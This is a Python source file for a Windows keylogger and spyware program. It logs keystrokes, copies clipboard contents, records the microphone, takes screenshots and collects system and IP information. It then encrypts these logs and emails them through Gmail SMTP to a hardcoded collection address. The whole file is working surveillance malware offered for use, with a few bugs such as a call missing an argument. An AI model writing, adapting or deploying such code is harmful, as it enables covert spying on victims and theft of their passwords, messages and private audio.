from email.mime.multipart import MIMEMultipart

from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import  encoders
import smtplib

import socket
import platform

# import win32clipboard
from win32 import win32clipboard

from pynput.keyboard import Key,Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import process,freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"     # creating a text file to store the keyloggs

system_information = 'systeminfo.txt'    # text file to store the system information

screenshot_information = "screenshot.png"    # creating a png file for taking screenshot at that time

clipboard_information = "clipboard.text" # creating text for storing the data that clipboard copied previous text

audio_infromation = "audio.wav"     # creating audio file which store the microphone sound for specified time

file_path = "C:\\Users\\ASUS\\Desktop\\AES\\projects"   # file path where you run your program
extend ="\\"
file_merg = file_path + extend    # directly attach the above files in the code

email_address = "giveyouremail@gmail.com"   #gmail id from which you want to send files
password = "*********"  #give the gmail id password

username = getpass.getuser() 

toemailaddress = "completedkeylogger@gmail.com"   # to whom you want to send the files

microphone_time = 10    # for how much seconds you want to recorde the audio

time_iteration = 15

number_of_iterations_end = 3

keys_information_e = "e_key_log.txt"   # encrypted keylogger file 

system_information_e = "e_system.txt"   #encrypted system info file

clipboard_information_e = 'e_clipboard.txt'   # encrypted clipboard file


key = "fTe3Kwj6fktlsBjCXFo5rlW6QBGxvOuJwjpTG4dWcP8="   # enter the key for encrypting and decrypting the files

# function for sending the email

def send_email(filename , attachment, toaddr):     
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['subject'] = 'Log file'
    body = "Body_of_email"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment,'rb')
    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition','attachment; filename = %s' % filename)
    msg.attach(p)
    s =  smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()     # using tls to secure the email sending process
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()

# send_email(keys_information , file_path + extend + keys_information ,toemailaddress)

# function to get the system information
def system_information():
    with open(file_path + extend + system_information,'a') as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text # type: ignore
            f.write("public ip addreess" + public_ip + '\n')    
        except Exception:
            f.write("couldn't get publick ip address")
        print("") 
        f.write("processor :" + (platform.processor()) + '\n')
        f.write("system : " + platform.system() + "" + platform.version() + '\n')
        f.write("machine" + platform.machine() + '\n')
        f.write("Hostname " + hostname + '\n')
        f.write("private ip address" + ipaddr + '\n')

# system_information()  

# function for clipboard data
def  copy_clipboard():
    with open(file_path + extend + clipboard_information,'a') as f :
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData() # type: ignore
            win32clipboard.CloseClipboard()
            f.write("clipboard data : \n" + pasted_data)
        except:
            f.write("clipboard can't be copied")
copy_clipboard()

# function to get the audio 
def microphone():
    fs = 44100 
    seconds = microphone_time   
    myrecording = sd.rec(int(seconds * fs), samplerate=fs,channels=2)
    sd.wait()
    write(file_path + extend + audio_infromation ,fs,myrecording)
microphone()

#function to take the screenshot  
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)   
    # you can also use the sleep() function to take the screenshot for specified time 
screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

#Block of code to generate the key enetered  
while number_of_iterations < number_of_iterations_end :        
    count = 0
    keys = []
    #function for keys pressed
    def on_press(key):
        global keys, count,currentTime
        print(key)
        keys.append(key)
        count +=1
        currentTime = time.time()
        if count >=1 :
            count = 0
            write_file(keys)
            keys =[]

# writing the keys used into files 
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("key") == -1:
                    f.write(k)
                    f.close()
    
    def on_release(key):
        if key == Key.esc :
            return False
        if currentTime > stoppingTime:
            return False
    
    with Listener(on_press = on_press, on_release = on_release) as listener: # type: ignore
        listener.join()
    
    if currentTime > stoppingTime:
        
        with open(file_merg + keys_information,'w') as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information,file_path+extend+screenshot_information) # type: ignore
        copy_clipboard()
        system_information()
        number_of_iterations +=1
        currentTime = time.time()
        stoppingTime =time.time() + time_iteration
#Block code to encrypt the files
files_to_encrypt = [file_merg + system_information,file_merg + clipboard_information,file_merg + keys_information]
encrypted_file_nmaes = [file_merg + system_information_e , file_merg + clipboard_information_e ,file_merg+keys_information_e]
count = 0
for encrying_file in files_to_encrypt:
    with open(files_to_encrypt[count],'rb') as f:
        data = f.read()
        
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    
    with open(encrypted_file_nmaes[count],'wb') as f:
        f.write(encrypted)
        
    send_email(encrypted_file_nmaes[count],encrypted_file_nmaes[count],toemailaddress)
    count += 1
    
# Block of code to decrypt the files which we are encrypted

# system_information_e = "e_system.txt"
# clipboard_information_e = "e_clipboard.txt"
# keys_information_e = "e_keys_logged.txt"
# encrypted_files = [system_information_e,clipboard_information_e,keys_information_e]
# count = 0
# for decrypt_file in encrypted_files:
#     with open(encrypted_files[count],'rb') as f:
#         data = f.read()       
#     fernet = Fernet(key)
#     decrypted = fernet.decrypt(data)   
#     with open(encrypted_files[count],'wb') as f:
#         f.write(decrypted)        
#     count += 1


time.sleep(300)  

#deletes all files 

# delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_infromation]
# for file in delete_files:
#     os.remove(file_merg + file)


